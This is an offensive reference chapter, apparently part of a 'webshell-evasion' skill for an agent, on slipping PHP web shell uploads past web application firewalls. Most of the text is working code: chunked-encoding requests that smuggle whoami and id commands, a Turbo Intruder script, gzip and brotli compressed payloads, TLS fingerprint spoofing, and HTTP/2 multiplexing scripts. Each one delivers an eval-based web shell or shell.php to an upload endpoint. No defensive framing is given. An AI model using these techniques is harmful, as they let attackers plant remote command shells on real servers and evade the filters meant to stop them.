### 9.1 Chunked Transfer Encoding

**HTTP request with chunked encoding:**

```http
POST /upload.php HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

1a
param1=value1&param2=
15
value2&pass=admin&c=
b
whoami&cmd=
a
id&param3=
10
value3&param4=value4
0

```

**Burp Suite Turbo Intruder chunked bypass script:**

```python
# Turbo Intruder script for chunked transfer bypass
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        engine=Engine.BURP2
    )

    # Build chunked request
    payload = "<?php @eval($_POST['cmd']); ?>"
    chunk_size = hex(len(payload))[2:]

    request = f"""POST /upload.php HTTP/1.1
Host: {target.host}
Transfer-Encoding: chunked
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

{chunk_size}
{payload}
0

"""

    engine.queue(request)
```

### 9.2 Compression-Based Bypass

**Gzip-compressed request body:**

```python
import gzip
import requests
import base64

payload = b'<?php @eval($_POST["cmd"]); ?>'
compressed = gzip.compress(payload)

# Option 1: Send as gzip-compressed body
headers = {
    'Content-Encoding': 'gzip',
    'Content-Type': 'application/x-www-form-urlencoded',
}
r = requests.post('http://target.com/upload.php', data=compressed, headers=headers)

# Option 2: Brotli compression
import brotli
compressed_br = brotli.compress(payload)
headers['Content-Encoding'] = 'br'
r = requests.post('http://target.com/upload.php', data=compressed_br, headers=headers)
```

### 9.3 TLS Fingerprint Masquerading

**JA3/JA4 fingerprint spoofing:**

```python
# Using Python with custom TLS library for JA3 fingerprint spoofing
# tls_client or curl_cffi can be used

import tls_client

session = tls_client.Session(
    client_identifier="chrome_120",  # Mimics Chrome 120 TLS fingerprint
    random_tls_extension_order=True   # Randomize TLS extension order
)

response = session.post(
    'https://target.com/upload.php',
    data={'file': open('shell.php', 'rb')},
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    }
)
```

**curl_cffi for TLS fingerprint bypass:**

```bash
# Using curl_cffi to impersonate Chrome
python3 -c "
from curl_cffi import requests
r = requests.post('https://target.com/upload.php',
    impersonate='chrome120',
    files={'file': open('shell.php', 'rb')}
)
print(r.status_code)
"
```

### 9.4 HTTP/2 Multiplexing

**HTTP/2 multiplexing for WAF bypass:**

```
Concept: WAF may inspect streams independently, losing correlation
between multiple streams in the same connection.

Attack:
1. Open HTTP/2 connection
2. Stream 1: Send benign request (normal file upload)
3. Stream 2: Send malicious request simultaneously
4. WAF inspects Stream 1, lets Stream 2 through
5. Or: Split payload across multiple streams
```

**Python HTTP/2 multiplexing:**

```python
import h2.connection
import h2.config
import socket
import ssl

# Create HTTP/2 connection
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])

sock = socket.create_connection(('target.com', 443))
tls_sock = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
tls_sock.sendall(conn.data_to_send())

# Stream 1: Benign request
conn.send_headers(1, [
    (':method', 'POST'),
    (':path', '/upload.php'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('content-type', 'multipart/form-data'),
])
conn.send_data(1, b'benign data', end_stream=True)

# Stream 3: Malicious request (simultaneous)
conn.send_headers(3, [
    (':method', 'POST'),
    (':path', '/upload.php'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('content-type', 'image/png'),
])
conn.send_data(3, b'<?php @eval($_POST["cmd"]); ?>', end_stream=True)

tls_sock.sendall(conn.data_to_send())
```



---
📖 本切片 1/2 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-09-waf-penetration-waf-02.md")`